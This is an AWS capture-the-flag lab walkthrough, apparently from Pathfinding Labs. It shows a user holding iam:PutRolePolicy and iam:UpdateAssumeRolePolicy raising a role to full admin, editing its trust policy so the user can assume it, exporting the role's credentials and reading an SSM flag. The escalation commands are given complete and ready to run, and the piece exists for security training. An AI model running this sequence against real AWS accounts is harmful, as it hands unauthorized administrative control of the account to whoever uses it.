# Guided Walkthrough: Privilege Escalation via iam:PutRolePolicy + iam:UpdateAssumeRolePolicy

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user possesses both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on a target role. This powerful combination allows an attacker to first escalate the role's permissions to administrative level, and then modify the role's trust policy to allow themselves to assume it — all without needing explicit `sts:AssumeRole` permissions.

The attack is particularly insidious because it exploits a commonly misunderstood aspect of AWS IAM: **named principals specified directly in a role's trust policy can assume that role without requiring `sts:AssumeRole` permissions in their own identity policies**. When a principal ARN is explicitly listed in a trust policy, AWS IAM automatically grants that principal the ability to assume the role, bypassing the need for an allow statement in the principal's own policies.

This privilege escalation path is often overlooked by security teams because it requires the combination of two distinct permissions that seem innocuous when evaluated separately. Organizations may grant `iam:PutRolePolicy` for managing role permissions and `iam:UpdateAssumeRolePolicy` for managing trust relationships, not realizing that together they provide a complete path to administrative access. The attack leaves clear audit trails in CloudTrail but can be executed quickly before detection mechanisms trigger alerts.

## The Challenge

You have obtained credentials for `pl-prod-iam-021-to-admin-starting-user`. This IAM user has no admin permissions and cannot directly access sensitive resources. However, it has been granted `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` on `pl-prod-iam-021-to-admin-target-role`.

Your goal is to leverage these two permissions together to achieve full administrative access to the AWS account.

## Reconnaissance

First, let's confirm who we are and what we're working with.

```bash
aws sts get-caller-identity
```

You should see your identity as `pl-prod-iam-021-to-admin-starting-user`. Now let's examine the target role to understand its current state before we modify it.

```bash
# See what inline policies the role currently has (likely none)
aws iam list-role-policies --role-name pl-prod-iam-021-to-admin-target-role \
  --query 'PolicyNames' --output text

# Check the current trust policy - who can assume this role right now?
aws iam get-role --role-name pl-prod-iam-021-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

The trust policy will show that the starting user is not a trusted principal — we can't assume the role yet. And even if we could, the role has no useful permissions. We need to fix both of those things.

Let's also confirm we can't do anything useful right now:

```bash
# This should fail - we don't have admin permissions
aws iam list-users --max-items 1
```

## Exploitation

### Step 1: Add an Admin Inline Policy to the Target Role

The first move is to use `iam:PutRolePolicy` to attach an inline policy that grants `*:*` (full administrative access) to the target role. Once this is in place, whoever assumes the role will be an effective administrator.

```bash
aws iam put-role-policy \
  --role-name pl-prod-iam-021-to-admin-target-role \
  --policy-name admin-escalation \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }'
```

Wait 15 seconds for the IAM change to propagate, then verify it worked:

```bash
aws iam list-role-policies \
  --role-name pl-prod-iam-021-to-admin-target-role \
  --query 'PolicyNames' --output text
```

You should see `admin-escalation` in the output. The role now has administrative permissions — but we still can't assume it because the trust policy doesn't allow us.

### Step 2: Update the Trust Policy to Allow Yourself to Assume the Role

Now use `iam:UpdateAssumeRolePolicy` to replace the role's trust policy with one that explicitly names our starting user as a trusted principal. This is the key step that makes the role assumable without needing `sts:AssumeRole` in our own identity policies.

First, get your user ARN:

```bash
USER_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "User ARN: $USER_ARN"
```

Now update the trust policy:

```bash
aws iam update-assume-role-policy \
  --role-name pl-prod-iam-021-to-admin-target-role \
  --policy-document "{
    \"Version\": \"2012-10-17\",
    \"Statement\": [
      {
        \"Effect\": \"Allow\",
        \"Principal\": {
          \"AWS\": \"$USER_ARN\"
        },
        \"Action\": \"sts:AssumeRole\"
      }
    ]
  }"
```

Wait another 15 seconds for this IAM change to propagate.

### Step 3: Assume the Now-Administrative Role

Now we can assume the role. Note the key insight here: even though our starting user has no `sts:AssumeRole` permission in its own identity policies, AWS will allow the assumption because our ARN is explicitly named in the role's trust policy. The trust policy itself grants this capability.

```bash
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-iam-021-to-admin-target-role"

TARGET_CREDENTIALS=$(aws sts assume-role \
  --role-arn "$TARGET_ROLE_ARN" \
  --role-session-name admin-escalation-session \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDENTIALS" | jq -r '.Credentials.SessionToken')
```

## Verification

With the assumed-role credentials exported, verify you now have administrative access:

```bash
# Confirm we're operating as the target role
aws sts get-caller-identity

# Demonstrate admin access by listing IAM users
aws iam list-users --max-items 3 --output table
```

If you see IAM users listed, you have confirmed full administrative access to the AWS account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the wildcard `Action=*` inline policy you just attached to the target role provides implicitly.

With the target role session credentials still active (from the `aws sts assume-role` call above), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-021-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a dangerous combination of two IAM permissions: `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy`. By using `iam:PutRolePolicy` you elevated the target role to admin, and by using `iam:UpdateAssumeRolePolicy` you added yourself as a trusted principal — enabling assumption without any `sts:AssumeRole` permission in your own policies.

In a real environment, this kind of misconfiguration commonly arises when developers are granted broad IAM management permissions "for convenience" without understanding the combined escalation risk. A security team evaluating `iam:PutRolePolicy` in isolation might not flag it as dangerous; the same goes for `iam:UpdateAssumeRolePolicy` in isolation. But together, they form a complete, two-step path to administrative takeover of the entire AWS account.
